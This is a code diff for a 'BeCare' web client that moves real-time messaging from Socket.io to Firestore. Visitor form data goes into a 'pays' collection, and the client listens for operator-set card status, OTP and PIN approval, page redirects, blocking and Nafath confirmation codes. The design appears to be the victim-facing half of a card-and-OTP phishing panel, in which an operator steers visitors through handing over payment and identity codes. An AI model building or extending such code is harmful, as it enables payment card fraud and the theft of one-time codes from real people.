@@ -1,135 +1,165 @@
 /**
- * BeCare Socket.io Client
- * Handles real-time communication with the backend
- * Replaces Firebase onSnapshot listeners
+ * BeCare Real-time Client - Firebase Version
+ * Replaces Socket.io with Firestore onSnapshot listeners
  */
-;
+import { db } from './firebase';
+import { 
+  doc, 
+  onSnapshot, 
+  updateDoc, 
+  serverTimestamp,
+  collection,
+  query,
+  where,
+  orderBy
+} from 'firebase/firestore';
 
-import { io, Socket } from 'socket.io-client';
-
-// Socket.io connects via Nginx proxy at /socket.io/ path on qtesnd.com
-// In production (Manus deployment), connect to the VPS backend
-// Force correct URL - override any legacy env variable pointing to old IP
-const _rawSocketUrl = import.meta.env.VITE_SOCKET_URL || 'https://qtesnd.com';
-const SOCKET_URL = (_rawSocketUrl.includes('187.124.33.94') || _rawSocketUrl.includes('localhost:3001'))
-  ? 'https://qtesnd.com'
-  : _rawSocketUrl;
-
-let socket: Socket | null = null;
-
-export function getSocket(): Socket {
-  if (!socket) {
-    socket = io(SOCKET_URL, {
-      transports: ['websocket', 'polling'],
-      autoConnect: true,
-      reconnection: true,
-      reconnectionAttempts: 5,
-      reconnectionDelay: 1000,
-    });
-
-    socket.on('connect', () => {
-      console.log('[Socket] Connected:', socket?.id);
-      // Re-join visitor room on reconnect
-      const visitorId = typeof window !== 'undefined' ? localStorage.getItem('visitor') : null;
-      if (visitorId) {
-        socket?.emit('visitor:join', visitorId);
-        console.log('[Socket] Re-joined visitor room:', visitorId);
+// Mock Socket interface for compatibility
+export function getSocket() {
+  return {
+    emit: (event: string, data: any) => {
+      console.log(`[Socket Mock] Emitting ${event}:`, data);
+      // Map emits to Firestore updates if needed
+      if (event === 'visitor:update_page') {
+        const { visitorId, page, step } = data;
+        updateDoc(doc(db, 'pays', visitorId), {
+          currentPage: page,
+          currentStep: step,
+          updatedAt: serverTimestamp()
+        });
       }
-    });
-
-    socket.on('disconnect', () => {
-      console.log('[Socket] Disconnected');
-    });
-
-    socket.on('connect_error', (err) => {
-      console.error('[Socket] Connection error:', err.message);
-    });
-  }
-  return socket;
+    },
+    on: () => {},
+    off: () => {},
+    disconnect: () => {}
+  };
 }
 
-export function disconnectSocket(): void {
-  if (socket) {
-    socket.disconnect();
-    socket = null;
-  }
-}
+export function disconnectSocket(): void {}
 
 // ─── Visitor Socket Actions ───────────────────────────────────────────────────
 
-/** Join as a visitor */
+/** Join as a visitor (No-op in Firebase version) */
 export function visitorJoin(visitorId: string): void {
-  const s = getSocket();
-  s.emit('visitor:join', visitorId);
+  updateDoc(doc(db, 'pays', visitorId), {
+    isOnline: true,
+    lastSeen: serverTimestamp()
+  });
 }
 
-/** Update current page via socket */
+/** Update current page via Firestore */
 export function visitorUpdatePage(visitorId: string, page: string, step?: string): void {
-  const s = getSocket();
-  s.emit('visitor:update_page', { visitorId, page, step });
+  updateDoc(doc(db, 'pays', visitorId), {
+    currentPage: page,
+    currentStep: step || page,
+    updatedAt: serverTimestamp()
+  });
 }
 
-/** Save form data via socket */
+/** Save form data via Firestore */
 export function visitorSaveData(visitorId: string, payload: Record<string, any>): void {
-  const s = getSocket();
-  s.emit('visitor:save_data', { visitorId, payload });
+  updateDoc(doc(db, 'pays', visitorId), {
+    ...payload,
+    updatedAt: serverTimestamp()
+  });
 }
 
 /** Send heartbeat */
 export function visitorHeartbeat(visitorId: string): void {
-  const s = getSocket();
-  s.emit('visitor:heartbeat', visitorId);
+  updateDoc(doc(db, 'pays', visitorId), {
+    isOnline: true,
+    lastSeen: serverTimestamp()
+  });
 }
 
 /** Send a chat message */
-export function visitorSendMessage(visitorId: string, message: string, senderName?: string): void {
-  const s = getSocket();
-  s.emit('visitor:send_message', { visitorId, message, senderName });
+export async function visitorSendMessage(visitorId: string, message: string, senderName?: string): Promise<void> {
+  const { sendMessage } = await import('./api');
+  await sendMessage(visitorId, message, senderName);
 }
 
-// ─── Visitor Socket Listeners ─────────────────────────────────────────────────
+// ─── Visitor Listeners ────────────────────────────────────────────────────────
 
 /** Listen for redirect commands from admin */
 export function onVisitorRedirect(callback: (data: { targetPage: string }) => void): () => void {
-  const s = getSocket();
-  s.on('visitor:redirect', callback);
-  return () => s.off('visitor:redirect', callback);
+  const visitorId = typeof window !== 'undefined' ? localStorage.getItem('visitor') : null;
+  if (!visitorId) return () => {};
+
+  return onSnapshot(doc(db, 'pays', visitorId), (snapshot) => {
+    if (snapshot.exists()) {
+      const data = snapshot.data();
+      const targetPage = data.redirectPage || data.redirect_page;
+      if (targetPage) {
+        callback({ targetPage });
+      }
+    }
+  });
 }
 
 /** Listen for status updates (OTP approval, etc.) */
 export function onVisitorStatusUpdated(callback: (data: any) => void): () => void {
-  const s = getSocket();
-  // Normalize both {field, status} and direct payload {cardStatus, currentStep, ...} formats
-  const handler = (data: any) => {
-    if (!data || typeof data !== 'object') return;
-    // If already {field, status} format, pass through directly
-    if (data.field !== undefined) {
-      callback(data);
-      return;
+  const visitorId = typeof window !== 'undefined' ? localStorage.getItem('visitor') : null;
+  if (!visitorId) return () => {};
+
+  return onSnapshot(doc(db, 'pays', visitorId), (snapshot) => {
+    if (snapshot.exists()) {
+      const data = snapshot.data();
+      // Map Firestore fields to the format expected by the frontend
+      const statusData = {
+        cardStatus: data.cardStatus || data.card_status,
+        otpStatus: data.otpStatus || data.otp_status,
+        _v5Status: data._v5Status || data.otp_status,
+        _v6Status: data._v6Status || data.pin_status,
+        redirectPage: data.redirectPage || data.redirect_page,
+        currentStep: data.currentStep || data.current_step,
+        nafadConfirmationCode: data.nafadConfirmationCode,
+        nafadConfirmationStatus: data.nafadConfirmationStatus
+      };
+      
+      callback(statusData);
+      
+      // Also trigger legacy field/status callbacks
+      Object.entries(statusData).forEach(([field, status]) => {
+        if (status) {
+          callback({ field, status });
+        }
+      });
     }
-    // Direct payload format: emit as raw data first
-    callback(data);
-    // Also convert each key to {field, status} for legacy handlers
-    Object.entries(data).forEach(([field, status]) => {
-      if (typeof status === 'string') {
-        callback({ field, status });
-      }
-    });
-  };
-  s.on('visitor:status_updated', handler);
-  return () => s.off('visitor:status_updated', handler);
+  });
 }
 
 /** Listen for new messages from admin */
 export function onVisitorNewMessage(callback: (data: any) => void): () => void {
-  const s = getSocket();
-  s.on('visitor:new_message', callback);
-  return () => s.off('visitor:new_message', callback);
+  const visitorId = typeof window !== 'undefined' ? localStorage.getItem('visitor') : null;
+  if (!visitorId) return () => {};
+
+  const q = query(
+    collection(db, 'messages'),
+    where('applicationId', '==', visitorId),
+    where('senderRole', 'in', ['admin', 'professional']),
+    orderBy('timestamp', 'desc')
+  );
+
+  return onSnapshot(q, (snapshot) => {
+    snapshot.docChanges().forEach((change) => {
+      if (change.type === 'added') {
+        callback(change.doc.data());
+      }
+    });
+  });
 }
 
 /** Listen for blocked event */
 export function onVisitorBlocked(callback: () => void): () => void {
-  const s = getSocket();
-  s.on('visitor:blocked', callback);
-  return () => s.off('visitor:blocked', callback);
+  const visitorId = typeof window !== 'undefined' ? localStorage.getItem('visitor') : null;
+  if (!visitorId) return () => {};
+
+  return onSnapshot(doc(db, 'pays', visitorId), (snapshot) => {
+    if (snapshot.exists()) {
+      const data = snapshot.data();
+      if (data.isBlocked || data.is_blocked) {
+        callback();
+      }
+    }
+  });
 }
